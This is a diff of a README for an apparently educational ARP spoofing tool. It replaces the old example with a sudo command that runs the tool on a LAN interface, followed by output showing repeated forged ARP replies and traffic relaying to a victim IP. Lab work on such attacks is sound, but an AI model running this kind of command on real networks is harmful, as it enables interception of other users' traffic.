@@ -1,23 +1,59 @@
-# send_arp
+#arp spoofing
 
-### Example
+###Example
 ```
-sudo ./send_arp en0 192.168.0.10 192.168.0.1
-
-My Dev : en0
-Victim's IP : 192.168.0.1
-Send IP : 192.168.0.10
-My IP : 192.168.0.100
+sudo ./main en0 192.168.0.1 192.168.0.100
+192.168.0.100
 My Mac : 4c:32:75:95:95:ed
+Job Count: 1
 
 -----------------------
 Getting Victim's Mac address...
+pcap_next Error!
+pcap_next Error!
+pcap_next Error!
 Got Victim's Mac address!!
-Victim's Mac : 70:4f:57:15:03:3a
+Victim's Mac : 4c:32:75:95:95:ed
 -----------------------
+Sent ARP reply To : 192.168.0.100
 
-Sending Fake ARP Reply...
-Succefully sent Fake ARP Reply
+Sent ARP reply To : 192.168.0.100
+
+Sent ARP reply To : 192.168.0.100
+
+Sent ARP reply To : 192.168.0.100
+
+Sent ARP reply To : 192.168.0.100
+
+Sent ARP reply To : 192.168.0.100
+
+Sent ARP reply To : 192.168.0.100
+
+Sent ARP reply To : 192.168.0.100
+
+Sent ARP reply To : 192.168.0.100
+
+Sent ARP reply To : 192.168.0.100
+
+Sent ARP reply To : 192.168.0.100
+
+Sent ARP reply To : 192.168.0.100
+
+Relaying 192.168.0.100
+Sent ARP reply To : 192.168.0.100
+
+Relaying 192.168.0.100
+Relaying 192.168.0.100
+Sent ARP reply To : 192.168.0.100
+
+Relaying 192.168.0.100
+Relaying 192.168.0.100
+Sent ARP reply To : 192.168.0.100
+
+Relaying 192.168.0.100
+Relaying 192.168.0.100
+Sent ARP reply To : 192.168.0.100
+
+Relaying 192.168.0.100
 ```
 
-# arp_spoofing
